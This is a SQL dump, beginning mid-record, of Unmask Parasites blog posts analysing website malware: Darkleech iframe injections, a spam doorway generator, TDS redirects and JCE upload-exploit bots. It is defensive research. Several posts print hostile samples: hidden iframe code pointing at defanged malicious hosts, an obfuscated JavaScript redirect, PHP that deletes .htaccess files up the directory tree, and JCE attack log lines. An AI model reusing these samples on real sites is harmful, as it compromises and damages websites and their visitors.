the sense in making this a hoax?', '', 'http://blog.unmaskparasites.com/2015/04/01/fancybox-for-wordpress-has-expired-infection/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (52, 'Darkleech Update – November 2014', 'unmask', '27 Nov 14', 'Loading site search ...          			                Darkleech Update – November 2014                          27 Nov 14   Filed in Short Attack Reviews, Website exploits                Just wanted to document some latest changes in Darkleech behavior that may help you detect it.I’d like to thank internet security enthusiasts who share their findings with me. Without you, I could have easily missed these new (?) details.Quick recapDarkleech is a root level server infection that installs malicious Apache modules. The modules inject invisible iframes into server response when it is already prepared (linebreaks added for readability).<style>.a4on6mz5h { position:absolute; left:-1376px; top:-1819px} </style> <div class=\"a4on6mz5h\"><ifr ame src=\"hxxp://tfmjst .hopto .org/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"247\" height=\"557\"></ifram e></div>All the elements of this code are random and auto-generated on the fly (style name, coordinates, iframe diminsions, URL paths). Moreover, the iframe domains change every few minutes — lately hackers prefer free No-IP.com dynamic DNS hostnames like hopto.org, ddns.net, myftp.biz, myftp.org, serveftp.com, servepics.com, etc.This infection is hard to detect as it only shows up once per IP per day (or maybe even more seldom). And since it works on a low system level, it can detect if server admins are logged in, so it lurks until they log out — this means that they won’t see anything even if they monitor outgoing TCP traffic.For more details, please check the links at the bottom of this post.What’s new?IE=EmulateIE9Recently, I’ve been pointed at the fact that now Darkleech also adds the following meta tag setting IE 9 compatibility mode in Internet Explorer. It looks like it searches for the </head> tag and replaces it with the following code (again, linebreaks added for readability):<meta http-equiv=\'x-ua-compatible\' content=\'IE=EmulateIE9\'></head><style>.syxq9la69 { position:absolute; left:-1666px; top:-1634px} </style> <div class=\"syxq9la69\"><iframe src=\"hxxp://jsnrgo .ddns .net/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"285\" height=\"554\"></iframe></div>This IE=EmulateIE9 instruction tells modern versions of Internet Explorer to render a web page as if they were IE 9, using all the features that has been deprecated in IE 10 and newer versions of IE. Some of the legacy features are known to have vulnerabilities and hackers try to exploit them turning the compatibility mode on (e.g. VML-related exploit)_SESSION_ID cookieIn addition to temporary IP blacklisting, Darkleech also uses the _SESSION_ID cookie that expires in one week. It adds the following cookie into response headers:Set-Cookie: _SESSION_ID=-1; expires=Wed 03-Dec-2014 09:32:48 GMT; path=/So even if you change your IP address (e.g. if you have a dynamic IP address) you still won’t see malware for the following 7 days. So don’t forget to clear/block cookies if you are trying to reproduce infected response.Most likely the IP blacklisting also works for one week now too.Just a couple of more things:As you might have figured out, it looks for Internet Explorer User-Agent (and derivatives like Maxthon, Avant).Referer is not important at the moment. I managed to trigger it even without the Referer header.That’s it for today. Please let me know if you have some other news about Darkleech.Previous posts about Darkleech:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsWorking With the Darkleech Bitly DataDarkleech + Bitly.com = Insightful Statistics (Sucuri blog)Server Compromises – Understanding Apache Module iFrame Injections and Secure Shell Backdoor (Sucuri blog)                                                                                   Tags: Apache Darkleech EmulateIE9 No-IP                                                    			                                            « Most Contradictive Doorway Generator                “Fancybox for WordPress Has Expired” Infection »            			    Reader\'s Comments (2)       	        			        			WordPress Malware Causes Psuedo-Darkleech Infection | Sucuri Blog | 26 Mar 2015 4:25 pm 						[…] and this is the code from November of 2014 […]                   			        			WordPress Malware Causas Psuedo-Darkleech Infección | Sucuri Español | 13 Apr 2015 10:41 pm 						[…] y este es el código de noviembre de 2014: […]', '', 'http://blog.unmaskparasites.com/2014/11/27/darkleech-update-november-2014/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (53, 'Most Contradictive Doorway Generator', 'unmask', '12 Sep 14', 'Loading site search ...          			                Most Contradictive Doorway Generator                          12 Sep 14   Filed in Short Attack Reviews                Check this thread on WordPress.org forum. The topic starter found a suspicious PHP file and asked what it was doing.The code analysis shows that it’s some sort of a spammy doorway. But it’s a very strange doorway and the way that it works doesn’t make sense to me.First of all, this script has a random text and code generator. The output it generates is [kind of] always unique. Here is a couple of output pages:http://pastebin.com/ymwMZMWPhttp://pastebin.com/Y6B7WM2T...<title>Is. Last spots brows: Dwelling. Immediately moral.</title></head><body>listend40721<span>Flowerill merry chimes - has: Her - again spirits they, wooers. Delight preserve. For he. Free - snow set - grave lapped, icecold made myself visitings allow, beeves twas. Now one:...We usually see such a random text, when spammers want search engines to index “unique” content with “right” keywords. But…1. the script returns the page with the 404 not found code.header(\"HTTP/1.1 404 Not Found\");so the page won’t be indexed by search engines.2. The obfuscated JavaScript code at the bottom of the generated page redirects to a pharma site after about a second.function falselye() { falselya=29; falselyb=[148,134,139,129,140,148,75,145,140,141,75,137,140,128,126,145,134,140,139,75,133,143,130,131,90,68,133,145,145,141,87,76,76,145,126,127,137,130,145,138,130,129,134,128,126,143,130,144,75,130,146,68,88];falselyc=\"\"; for(falselyd=0;falselyd<falselyb.length;falselyd++) { falselyc+=String.fromCharCode(falselyb[falselyd]-falselya); } return falselyc; } setTim eout(falselye(),1263);decodedwindow.top.location.href=\'hxxp://tabletmedicares .eu\';Update: on another site the script redirected to hxxp://uanlwkis .com (also pharma site), which was registered only a few days ago on Sept 6th, 2014.But the generated text has no pharma keywords. One more hint that it’s not for search engines. Maybe it’s an intermediary landing page of some email spam campaign that just needs to redirect visitors? I saw many such landing pages on hacked sites. But it most cases they looked like the decoded version of the script — just a redirection code. Indeed why bother with sophisticated random page generator if no one (neither humans nor robots) is going to read it?3. There is also this strange piece of code:$s=\'/\';if (strtolower(substr(PHP_OS,0,3))==\'win\') $s=\"\\\\\\\\\";$d=array(\".$s\");$p=\"\";for($i=1; $i<255; $i++){$p.=\"..$s\";if (is_dir($p)){array_push($d,$p);}else{break;}}foreach($d as $p){$a=\"h\".\"tac\".\"c\".\"es\".\"s\";$a1=$p.\".$a\";$a2=$p.$a;$a3=$p.\"$a.txt\";@chmod($a1,0666);@unlink($a1);@chmod($a2,0666);@unlink($a2);@chmod($a3,0666);@unlink($a3);}What it does it tries to find an delete(!) all file with names .htaccess, htaccess and htaccess.txt in the current directory and all(!) the directories above the current.That just doesn’t make sense. Why is it trying to corrupt websites? I would understand if it only removed its own files and injected code in legitimate files, but it tries to just remove every .htaccess (and its typical backups) without checking what’s inside. That’s a really disruptive and annoying behavior given that many sites rely on the settings in .htaccess (e.g. most WordPress and Joomla sites).It’s indeed a most contradictive doorway generator that I ever seen. I can’t find any good explanation why it does things the way it does. Maybe you have any ideas?Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for SpammersHtaccess Redirect to Example.ru/dir/index.phpIntroduction to Website Parasites                                                                                  Tags: doorway htaccess redirect                                                    			                                            « Google -> Doorway -> Google -> Spam                Darkleech Update – November 2014 »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/09/12/most-contradictive-doorway-generator/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (54, 'Google -> Doorway -> Google -> Spam', 'unmask', '11 Jun 14', 'Loading site search ...          			                Google -> Doorway -> Google -> Spam                          11 Jun 14   Filed in Uncategorized                Just a few thoughts about an interesting behavior of a black-hat SEO doorway.Typically hackers create doorways on compromised sites to make search engines rank them for certain keywords and then, when searchers click on the links in search results, those doorways redirect them further to a site that hackers really promote. Sometime that redirect may go through some TDS (traffic directing service) but the whole scheme remains pretty much the same:Search results -> doorway -> beneficiary siteToday, when doing a backlink research of one of such pharma doorways, I encountered a different scheme — a one with a loop.The doorway had this URL structure:http://www.hacked-site.com/blog/?prednisolone-without-prescriptionWhen I checked it in Unmask Parasites or in Google cache, I saw spammy content with links to doorways on other hacked sites. Quite typical.When I opened that page in a web browser, it redirected to a TDShxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&gdw=w-48&gdf=%2F90dc16aaf3e24ea68c94c3f784a37ff9-f08f149982bf04ffaa308aba00b2d569.txt&host=www.hacked-site.com&kw=prednisolone%20without%20prescription&HTTP_REFERER=https%3A%2F%2Fwww.google.com%2F%3Fsource%3Dnoref%26q%3Dprednisolone%2520without%2520prescriptionCloaking and conditional redirects to traffic directing services are also quite typical for doorways.Then TDS made another hop:hxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&seoref=8bB06MP5xFTR3TkqmNILbbW5mW30f%2B%2FMiQdbatwxiv5CUUTkQjEO75VtTs7IRqdVTmPfmX……..2FIXHlBdqV6iDd1ruYQMhqmYVCozdkTrAN76fOABiczAnd then I ended up on … Google:http://www.google.com/search?q=prednisolone+without+prescriptionAnd that is not very typical. But interesting.One one hand, it looks like the spammers didn’t consider me as a target traffic (probably because of my IP) and redirected back to the Google search results page for the same query that I supposed to be using when found that site. For some, this chain of redirects may look as if they clicked on a search result and then Google thought for some time and reloaded the same page, which may look like just a glitch.On the other hand, it looks like a second level of search engine optimization, when spammers fine tune a search query that may return better doorways. I can’t help thinking about this because when I see the search results on Google pages that the TDS redirects me to, I realize that most of them are doorways on hacked sites (yes, including those with fake stars in ratings).I know, it’s quite pointless. Why redirect people who already clicked on your doorway to a new set of search results? Although those results may contain some of your other doorways, there is no guarantee that the searcher will not go away or click on them and not on links of your competitors? And you can’t control Google search results — it may happen that there will be no your doorways on the results page.OK. Let’s try to think as the TDS owners. The TDS recognizes the traffic that it doesn’t need for the pharma campaign. It mayredirect it to pharma landing pages anyway (which may decrease the quality and the price of such a traffic)dispose of that traffic altogether (redirect it to a neutral third-party site, like Google)try to monetize that traffic anyway — redirect it to some scam site, porn site, malware site or any other resource that knows how to take advantage of low quality traffic.<warning:unfounded speculation>But what it the spammers also run another campaign that targets the traffic that doesn’t fit their pharma campaign? They can simply redirect the traffic to landing pages of the second campaign. But such traffic will not be targeted. People searched for different things. So maybe it is worth it to “re-target” the traffic and redirect the searchers to a Google result page for keywords relevant to that second campaign and that contains links to their doorways.Here’s the scenario:People search something on Google and click on some result. For some reason Google reloads the page and shows them completely different results for a different query. Some searchers will definitely leave (don’t worry, this was unwanted traffic anyway) but some may become interested in what Google offers them and click on results (after all spammers usually promote something that people need and if it comes from Google it looks more legit). So, instead of either lost or untargeted traffic, they get targeted traffic of people who willingly clicked on search results. All they need to do is make sure their doorways dominate for relevant search queries (shouldn’t be hard since the TDS provide the search query itself and there is no need to rank for short generic queries.)</warning:unfounded speculation>OK, enough speculations. That particular campaign was not using the second level Google optimization. It simply dumped unneeded traffic back to Google. When opening the same doorways from different country IPs, the TDS redirected me to a random “Canadian Pharmacy” site from its pool of about a dozen of sites.Anyway, the point of this post is despite of Matt Cutts’ recent announcement of rolling out the second ranking update for “very spammy queries” I still see that 50% or more of top search results for pharma keywords still point to doorways on hacked sites.This past weekend we started rolling out a ranking update for very spammy queries: http://t.co/NpUZRqpnBI— Matt Cutts (@mattcutts) May 21, 2014And as long as “very spammy queries” return “very spammy results”, there will be incentive for black hat SEOs to hack sites and create doorways there.Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesIntroduction to Website Parasites                                                                                  Tags: black hat seo doorway TDS                                                    			                                            « Working With the Darkleech Bitly Data                Most Contradictive Doorway Generator »            			    Reader\'s Comments (2)       	        			        			SearchCap: Google PayDay Loan 3.0, Bing Ads URL Tagging & World Cup Fever | 12 Jun 2014 9:14 pm 						[…] Google -> Doorway -> Google -> Spam, Unmask Parasites. Blog. […]                   			        			Rosanne & Jerry Shalf | 03 Dec 2014 6:27 pm 						I keep getting redirected to a Canadian drugstore site when I type in ashlandmuseum.org. Before the Canadian drugstore site pops up I see something that looks like tds….etc. but it quickly moves to the Canadian site, so I don’t know the complete set of letters.  I have a macbook pro 2012 and am using Maverick 10.9.5 OS.  It doesn’t always happen, which is weird, and it only happens on my computer, not others.  It happens when I use Firefox and Safari.  How do I get rid of it?  I had Applecare go through the machine and we got rid of various viruses, but we couldn’t fix this one.  Applecare said it was because of something Google did and only Google can fix, but I can’t figure out how to reach Google and ask for help.  Please, somebody, help me!!', '', 'http://blog.unmaskparasites.com/2014/06/11/google-doorway-google-spam/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (55, 'Working With the Darkleech Bitly Data', 'unmask', '10 Feb 14', 'Loading site search ...          			                Working With the Darkleech Bitly Data                          10 Feb 14   Filed in General                Data Driven Security took the time to analyze the raw data that I published in my recent post on Sucuri blog about how I used Bitly data to understand the scale of the Darkleech infection.In their article, they have a few questions about data formats, meaning of certain fields and some inconsistencies, so I’ll try to answer their questions here and explain how I worked with the data.So I needed to get information about all the links of the “grantdad” bitly account.I checked the API and somehow missed the “link_history” API request (it was the first time I worked with the bitly API), so I decided to screenscrape the web pages where bitly listed the links creaded by grantdad. 1,000 pages with 10 links on each. Since pages didn’t contain all the information I needed I only collected the short links so that I could use them later in API calls to get more detailed information about each of them.As you can see I was limited with the 10,000 links that bitly made available via their web interface. Not sure if I could get more links via that link_history API. Right now it returns “ACCOUNT_SUSPENDED” and when it was not suspended, API calls for known links beyond those 10,000 produced various errors.When I compiled my list of 10,000 links I used the following API calls to get information about each of the links:Referring domainsAPI:link/referring_domains — for each link, it returned a list of domains referring traffic to this link (in our case sites, containing the iframes) along with the number of clicks from each domain. This helped me compile this list of iframe loads per domain: http://pastebin.com/HYaY2yMb. Then I tried to resolve each of the domain names and created this list of infected domains per IP address: http://pastebin.com/Gxr51Nc1.I also used this API call to get number of iframe loads for each bitly link.InfoAPI:link/info – this gave me timestamps of the links and their long URLs (the rest information was not interesting for my research). Unfortunately, this particular API call is poorly documented so I can only guess what this timestamp mean. It is actually called “indexed“. But I guess it’s the time when the link was created. It is definiteley not the time of the first click because there were no registered clicks for many of the links. As a result, I compiled these datasets:http://pastebin.com/UmkDZZp0http://pastebin.com/w7Kq3ybV ,which contain tab separated values of “bitly link id”, “timestamp”, “# of clicks/iframe loads”, and “long URL”.At that point, I already had the number of iframe loads from the previous step (“link/referring_domains“). Then, for readability, I converted the numeric timestamp using this Python function datetime.datetime.fromtimestamp(). However, you can notice that the second dataset (for January 28th) has a different date format. Instead of “2014-01-25 19:10:07” it uses “Jan 28 23:10:19“. Why? Because of pastebin.com. Because it doesn’t allow unregistered users to post more than 500Kb of data (I deliberately post such data as a guest). Removing the year from the date allowed me to save 4 bytes on each row and fit the dataset in 500Kb.Actually this 500Kb limit is the reason why I have separate pastebins for each date and only specify bitly ids instead of the full bitly links.CountriesAnd finally, API:link/countries – for each link, it returned a list of countries referring traffic to this link along with the number of clicks from those countries. This helped me compile this list of iframe loads per country http://pastebin.com/SZJMw3vx.The last dataset Feb 4-5When I wrote my blogpost on February 5th, I noticed that there were new links available on the Bitly.com grantdad acount page. I began to browse pages of his links and figured that most of the links were the same (Jan 25 and 28) but around 1,700 of them were new (late February 4th and the beginning of February 5th). I immediately repeated the same procedure that included screenscraping, and 3 API calls for each new bitly link. After that I created this new dataset http://pastebin.com/YecHzQ1W and updated the rest datasets (domains, countries, etc).Some more detailsIf you check the total numbers in these two datasets (domains) http://pastebin.com/HYaY2yMb and (countries) http://pastebin.com/SZJMw3vx you’ll see the different in total number of iframe loads: 87152 and 87269. I don’t know why. I used the same links just different API calls (referring_domains and countries) and the totals are supposed to be the same. I didn’t save the “per link” data so can’t tell exactly whether it was my error or the bitly API produces slightly inconsistent results. Anyway, the difference is neglectable for my calculations and doesn’t affect the estimations (given that I tried to underestimate when in doubt ).I didn’t check for duplicates that guys from Data Driven security found in my datasets. They must have to do with my screenscraper and the way that Bitly.com displays links in user accounts. The total number of scraped links matched the number of links that Bitly reported for the user. The extra 121 clicks that these duplicates are responsible for are so close to the 117 difference that I mentioned above so I wonder if these numbers somehow connected? Anyway, this shouldn’t affect the accuracy of the estimates either.Building the geo distribution mapFor the map, I used the Geochart from Google visualization. Since the difference in numbers of clicks for the top 3 countries and the lower half of the list was 3 orders of magnitude, I had to re-scale the data so that we could still see the difference between countries with 50 iframe loads and 2 iframe loads.. I used a square of a natural logarithm for thatMath.pow( Math.round( Math.log(i)), 2)This gave me a nice distribution from 0 to 100 and the below map.IFrame Load Geo DistributionSpeculation on the link generationAfter checking the link creation per minute-of-an-hour distribution, Bob Rudis wondered:This is either the world’s most inconsistent (or crafty) cron-job or grantdad like to press ↑ + ENTER alot.I guess, it was neither cron-job nor manual link creation. I think the [bitly] links were created on-demand. So if someone loads a page and Darkleech needs to inject an iframe then it (or rather the server it works with) generates a new bitly link. Given that this malware may lurk on a server, there may be time periods when no malicious code is being injection into any web pages across all the infected servers. At the same time, the bitly links with zero clicks may refer to page loads by various bots (including our own) when the malicious code is injected but the iframe is never loaded. On the other hand, the volume of bitly links with 0 clicks (~35%) suggests that there might really more complex link generation mechanism than a simple “on-demand” approach.Anyway, that’s great when people double check our data and try to find new interesting patterns there. Make sure to let me know (here or on the Sucuri blog) if you find more patterns and inconsistencies, or have any comments on how the Darkleech works.Related posts:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsBety.php Hack. Part 2. Black Hats in Action.Introduction to Website Parasites                                                                                  Tags: Bitly Darkleech data statistics                                                    			                                            « Invasion of JCE Bots                Google -> Doorway -> Google -> Spam »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/02/10/working-with-the-darkleech-bitly-data/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (56, 'Invasion of JCE Bots', 'unmask', '27 Jan 14', 'Loading site search ...          			                Invasion of JCE Bots                          27 Jan 14   Filed in Website exploits                Joomla has been one of the most popular CMS for a long time.  It powers a huge number of sites.  That’s great! The flip side of this fact is Joomla has been very popular for a long time and there are still very many sites that use older versions of Joomla as well as older version of Joomla components. For example, the 1.5.x branch of Joomla (2008-2010) still has a noticeable share in live Joomla sites.Old versions may work well for your site but they have multiple well known security holes, so they are the low hanging fruit for hackers. Let me show this using a real world example.JCE attackThere is a JCE component — a fancy content editor that can be found almost on every Joomla site. It has a well known security hole that allows anyone to upload arbitrary files to a server.You can easily find a working exploit code for this vulnerability.  What it does is:Checks whether a vulnerable version of JCE is installed (2.0.11, 2.0.12, 2.0.13, 2.0.14, 2.0.15, 1.5.7.10, 1.5.7.11, 1.5.7.12, 1.5.7.13, 1.5.7.14)Exploits the bug in the JCE image manager to upload a PHP file with a .gif extenstion to the images/stories directoryThen uses a JSON command to rename the .gif file to *.php.Now you have a backdoor on a server and can do whatever you want with the site.This is how this attack looks in logs (real example):197.205.70.37 - - [23/Jan/2014:16:46:54 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.0\" 200 302 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20 HTTP/1.0\" 200 329 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"GET /images/stories/3xp.php HTTP/1.0\" 200 465 \"-\" \"BOT/0.1 (BOT for JCE)\"As I mentioned, JCE is a very popular component and there are still many sites that use old versions of this component. No wonder, hackers are scanning the Internet for such vulnerable sites.  They reworked the exploit code for use in their automated tools that relentlessly test millions of sites, one by another.  These days, I can find multiple requests with the “BOT/0.1 (BOT for JCE)” User-Agent string in logs of almost every site that I check, even in logs of sites that have never had Joomla installed.I’d like to share some interesting statistics of a real site that had been hacked using this JCE hole and then was being routinely reinfected every day.7,409 requests with the User-Agent “BOT/0.1 (BOT for JCE)” that came from 785 different IPs during the period of Dec 24th – Jan 24th (one month)239 requests from 51 unique IP addresses during the last 24 hours4 independent (uploaded different types of backdoors) successful infections during one day.plus, multiple tests for other vulnerabilities.To webmastersAs you can see,  this is something that you can’t neglect or consider an insignificant threat.  It’s silly to hope that hackers won’t find your site. Today hackers have resources to spider the Internet almost as efficiently as Google just about 10 years ago, so there is almost no chance your site will stay unnoticed. The only way to prevent the hacks is to be proactive:  keep all software up-to-date and harden your sites.In case of this particular JCE attack:Make sure to upgrade your Joomla site to the most current version.Upgrade JCE to the latest version. You can find download packages for all the three branches of Joomla here.Protect all file upload directories and all directories that shouldn’t contain .php files. For example, place the following .htaccess file there to prevent execution of PHP files:<Files *.php>deny from all</Files>Try blocking requests with the “BOT/0.1 (BOT for JCE)” User-Agent string.  Of course, this shouldn’t be considered as a real protection. Hackers can change the User-Agent string to whatever they want. But it can help keep some dumb annoying bots away from your site.If, for some reason, you can’t upgrade your site at this moment, consider placing it behind a website firewall that will block any malicious traffic before it reaches your server.  This is something that we call virtual patching in Sucuri CloudProxy.                                                                                  Tags: exploit JCE Joomla                                                    			                                            « Reporting Suspicious Styles                Working With the Darkleech Bitly Data »            			    Reader\'s Comments (8)       	        			        			Jim Walker | 28 Jan 2014 5:47 pm 						Nicely done!The JCI component “problem” and has been a thorn in the Joomla communities side for years.I would go so far as to say that 1/2 of all of the hacked Joomla installations I’m asked to repair are JCE exploit related.As mentioned, simply adding the .htaccess “no execute php” file within the images/stories directory generally does the trick, though upgrading is always best.Personally, for this particular exploit, I prefer the below in my .htaccess file:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shI like how you linked out to Google and known JCE exploits as well.A quality post top to bottom. Kudos!                   			        			Denis | 28 Jan 2014 7:12 pm 						Thanks Jim,That “text/plain” handler also does the trick and covers a broader range of attacks.I don’t want to link directly to exploits. But if you want to find the information, this Google search is enough. At the same time, if there is some new JCE file upload vulnerability, this search will show it too, so the link will remain fresh and useful.                   			        			machineX | 19 Sep 2014 9:05 am 						I just seen it in some logs for the second time. We do not use joomla. But I think your .htaccess code is very useful in preventative measures for sites overall.                   			        			Brian M | 20 Feb 2014 3:10 pm 						I’m curious if you would have any more information on exactly what is allowing the exploit to work? I understand it’s an exploit in code which was in an old version of Joomla, but my vBulletin sites are apparently being exploited by this Bot for JCE script. I do not have any pieces of Joomla installed on the server – at least, not that I’m aware of. Thankfully Microsoft Security Essentials is catching the backdoor/shell script being uploaded to the site and is removing it before they can use it, but it scares me that they’re able to upload the file to my site in the first place. I’ve tried to get help from vBulletin but they brush it off as not being on their end.                   			        			Denis | 11 Jun 2014 5:13 pm 						In case of Joomla JCE, it just uses a bug to upload a PHP file as a .gof and then change it’s extension to .php.If you don’t have Joomla, then you might see multiple attempts to scan your site for that JCE security hole. They do it on every site. If they find it – they exploit it, if not they move on to the next site. So what you are seeing is probably just attack attempts, not successful attacks. On the other hand, if hackers find vulnerabilities in vBulletin or any other type of site, they’ll most likely upload pretty much the same backdoors as if it was Joomla.vBulletin may be slightly different as most of it’s malware lives in its database.                   			        			JCE Joomla Extension Attacks in the Wild | Sucuri Blog | 26 Mar 2014 8:11 pm 						[…] Unmask: Invasion of JCE Bots […]                   			        			catalina | 30 Mar 2014 6:23 am 						If I understood, I have to open my .htaccess file and insert these lines:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shThats it?Which are the “collateral effects” of this?Thanks in advanceCatalina                   			        			Denis | 11 Jun 2014 5:16 pm 						This code makes web server treat such files as regular text files. I.e. instead of executing any code in them, it will just display their content in a browser as if they were plain text files.The side effect is you won’t be able to have executable scripts in those directories. But it’s the point of this trick – place it to the directories that shouldn’t have executable files', '', 'http://blog.unmaskparasites.com/2014/01/27/invasion-of-jce-bots/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (57, 'Reporting Suspicious Styles', 'unmask', '22 Nov 13', 'Loading site search ...          			                Reporting Suspicious Styles                          22 Nov 13   Filed in Unmask Parasites                Back in 2008, the very first task that I created Unmask Parasites for was scanning web pages for hidden links.I read an article about thousands of WordPress blogs being stuffed with dozens of invisible spammy links. I had a self-hosted WordPress blog too and that article made me think if there was some easy way to figure out whether my blog was hacked, something less laborious than manually examining the HTML code link by link. So I decided to create a tool that would show all domains that my web pages linked to highlighting those of them that had “invisible” styles. This approach has proved to be very efficient in identifying black hat SEO hacks. In most cases, a glance is enough to spot such problems.It works well even when the tool doesn’t highlight links as “hidden” (either because the “hiding rule” was not detected or because it scanned the “cloaked” page created specifically for search engines). You can still see the links that clearly don’t belong to your site, which tells you that something’s wrong.However, looking for suspicious links is not the bullet-proof method for detecting spam injection issues. For example, in my yesterday’s post on Sucuri blog, I wrote about fake WordPress plugins that used to injects spammy links and a JavaScript code into web pages. However, at the moment, they inject some hidden spammy auto-generated text that doesn’t have any links.You can use this Google query to reveal affected sites [cigarettes AND (“3200 unhealthy” OR “3300 hazardous”)]I don’t know why they do it, but webmasters should definitely be warned about such injections because it’s a sign of a problem that should be fixed as soon as possible. This is actually more serious than just a factor that can potentially affect site’s search ranking. Those fake plugins fetch the spammy content from remote servers and inject it into blog pages on the fly. This means that hackers can change it any time and the same moment the new spammy block will be injected into all compromised sites. Or it can be a malicious block, which makes things more serious as it will affect all visitors to those sites too.Unfortunately, such injections were not reported by Unmask Parasites since there were no links in the spammy block. After thinking about the problem, I decided that Unmask Parasites should also report pure HTML tricks such as that clip:rect style trick that hackers use to hide their injections.So , starting this week, you may see the “Suspicious Styles” section in Unmask Parasites reports.In this section, you will see excerpts of the style definitions that Unmask Parasites considers suspicious. If you see it in your site reports, then you should check the HTML code of your pages and figure out whether that style is a normal part of your pages or it was added there to hide something illicit.Note, if you can’t find such code in your web pages, it doesn’t mean it is not there. The code injection can be conditional, and server files may fetch it from a remote location (as in this case with fake WordPress plugins), or it can be encrypted. Just remember that Unmask Parasites works in real time (some results may be cached for up to an hour) and if it reports something, then you can be sure it was on a web page at the moment of scanning.To Unmask Parasites usersIf you like Unmask Parasites and want to help improve it, you can inform me about interesting tricks that hackers use to hide injected content Or send me examples of infected web pages where Unmask Parasites doesn’t report any problems.Thanks!Related posts:Unmasking “Canonical” HacksRich Snippets in Black Hat SEOIntroduction to Website Parasites                                                                                  Tags: black hat seo hidden links spam                                                    			                                            « Unmask Parasites joins Sucuri                Invasion of JCE Bots »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/11/22/reporting-suspicious-styles-2/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (58, 'Unmask Parasites joins Sucuri', 'unmask', '20 Sep 13', 'Loading site search ...          			                Unmask Parasites joins Sucuri                          20 Sep 13   Filed in Unmask Parasites                It’s official. This week Unmask Parasites joins Sucuri!Since July of 2008 when I released the first public version, Unmask Parasites was a “one man project” and it worked fine for me most of the time. I did everything myself from server setup to site development, from web attack investigations to blogging here. During these years Unmask Parasites became quite noticeable both within webmasters and Internet security community. And I always tried to meet their expectations providing a tool that could reveal various obscure website security issues and sharing information on how and why websites get hacked, and what can be done to prevent it.When Sucuri approached me and asked if I wanted to join their team as a malware researcher, I didn’t think much. I’ve been watching this company since 2010 and knew how much we had in common in our approach to Internet security. We both focus on helping site owners to detect security problems and protect their sites. We do our best to educate webmasters about things that hackers do with compromised websites — unmasking their dirty tricks is an important part of our work. In 2011 we established good relationship and began to help each other by sharing our information about ongoing massive attacks. Now Sucuri has grown to one of the leading companies in its field and makes a significant impact on how many thousands of site owners protect their sites. It’s an honor for me to join this company and the team of professionals that I know for so long time.I guess you wonder what will happen to Unmask Parasites scanner and this blog? They are here to stay! I will still be responsible for Unmask Parasites and continue to improve it and publish my blogposts here. Even better: now that I’m with Sucuri, I will have access to large volumes of data from their tools and support team (something that I really missed during the last five years), which will definitely facilitate my investigations, and, in turn, improve the quality of Unmask Parasites scanner and Sucuri own tools.For additional information check the Sucuri’s announcement.Let’s unmask parasites!Related posts:Let’s Unmask Parasites1 Million Pages Checked by Unmask Parasites!Unmask Parasites. A Year of Blogging.                                                                                  Tags: Sucuri                                                    			                                            « Analyzing [Buy Cialis] Search Results                Reporting Suspicious Styles »            			    Reader\'s Comments (2)       	        			        			Jackie McBride | 21 Sep 2013 3:36 pm 						Denis, I cannot think of anyone more deserving than you of this opportunity. Hearty congratulations & many blessings in your new venture as you go forward! & Sucuri better realize how damn lucky they are lol. From the sound of the announcement, it appears they do. Again, congratulations!                   			        			Sucuri Expands Research Efforts with Acquisition of Unmask Parasites | Sucuri Blog | 15 Sep 2014 11:50 pm 						[…] Unmask Parasites blog post […]', '', 'http://blog.unmaskparasites.com/2013/09/20/unmask-parasites-joins-sucuri/\n');
